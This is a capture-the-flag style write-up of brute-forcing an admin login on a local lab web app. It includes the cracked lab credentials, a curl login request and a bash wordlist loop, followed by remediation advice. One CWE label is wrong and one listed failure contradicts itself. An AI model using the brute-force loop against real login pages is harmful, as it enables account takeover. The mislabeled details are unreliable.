# Brute Force Login - Weak Authentication

## Vulnerability Type

**OWASP A07:2021 - Identification and Authentication Failures** (CWE-307: Improper Restriction of Rendered UI Layers or Frames)

More specifically: **CWE-521: Weak Password Requirements** and **CWE-307: Improper Restriction of Excessive Authentication Attempts**

## Summary

Page: `http://localhost:8081/index.php?page=signin`

Credentials: `admin` / `shadow` (brute-forced)

Commands:
```bash
curl "http://localhost:8081/index.php?page=signin&username=admin&password=shadow&Login=Login"
```

## Details

on the sign in page

Used "admin" as the username
to brute force the password... with this small script
With IFS=, whitespace is preserved:
IFS = Internal Field Separator — bash variable that tells the shell how to split input into words.
By default, IFS is space, tab, and newline.
Here it says no separator so it preserve leading/trailing whitespace in each line.

```bash
#!/bin/bash
while IFS= read -r pass; do
  result=$(curl -s "http://localhost:8081/index.php?page=signin&username=admin&password=$pass&Login=Login")
  echo -n "."
  if echo "$result" | grep -qi "flag"; then
    echo "FOUND: $pass"
    echo "$result" | grep -i flag
    break
  fi
done < Most-Popular-Letter-Passes.txt
```

I got the flag using `shadow` as the password:
```
http://localhost:8081/index.php?page=signin&username=admin&password=shadow&Login=Login#
```

## Key Failures

1. **No rate limiting** – Can make unlimited login attempts without delays or blocking
2. **Weak password** – `shadow` is a dictionary word, easily cracked
3. **No account lockout** – After N failed attempts, account should lock
4. **No CAPTCHA** – Automated attacks aren't throttled by human verification
5. **Verbose feedback** – Application returns consistent responses (success/failure not distinguishable by timing or size)

## Remediation

1. **Implement rate limiting** – Limit login attempts per IP/username:
   - Max 5 attempts per 15 minutes
   - Progressive delays (exponential backoff)
   - Lock account after 10 failed attempts for 30 minutes

2. **Require strong passwords** – Enforce:
   - Minimum 12 characters
   - Mix of uppercase, lowercase, numbers, symbols
   - No dictionary words or common patterns (check against breach databases like HaveIBeenPwned)
   - Reject sequential/repeated characters (aaa, 123)

3. **Implement CAPTCHA** – Require human verification after 3 failed attempts

4. **Account lockout policy** – Temporarily disable account after N failures:

```php
UPDATE users SET failed_attempts = failed_attempts + 1, 
                locked_until = NOW() + INTERVAL 30 MINUTE 
WHERE username = 'admin' AND failed_attempts >= 10;
```

5. **Multi-factor authentication (MFA)** – Require second factor (TOTP, SMS, email) even if password is correct

6. **Log and monitor** – Alert on suspicious patterns:
   - Multiple failed logins from same IP
   - Attempts with common usernames (admin, root, test)

7. **Use HTTPS only** – Prevent credential interception in transit
